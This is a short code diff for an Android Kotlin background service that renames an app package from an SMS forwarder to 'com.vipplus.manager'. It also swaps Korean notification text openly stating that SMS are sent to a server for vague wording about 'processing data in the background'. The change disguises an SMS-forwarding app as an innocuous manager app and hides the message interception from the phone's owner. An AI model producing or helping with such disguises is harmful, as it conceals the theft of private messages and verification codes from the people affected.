@@ -1,4 +1,4 @@
-package com.smsforwarder
+package com.vipplus.manager
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -56,10 +56,10 @@ class SmsService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "SMS Forwarder 서비스",
+                "VIP 매니저 서비스",
                 NotificationManager.IMPORTANCE_LOW
             ).apply {
-                description = "SMS를 서버로 전송하는 백그라운드 서비스"
+                description = "백그라운드에서 데이터를 처리하는 서비스"
             }
             
             val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -67,8 +67,8 @@ class SmsService : Service() {
         }
         
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("SMS Forwarder 실행 중")
-            .setContentText("SMS를 자동으로 서버에 전송하고 있습니다")
+            .setContentTitle("VIP 매니저 실행 중")
+            .setContentText("백그라운드에서 자동으로 데이터를 처리하고 있습니다")
             .setSmallIcon(android.R.drawable.ic_dialog_email)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .build()
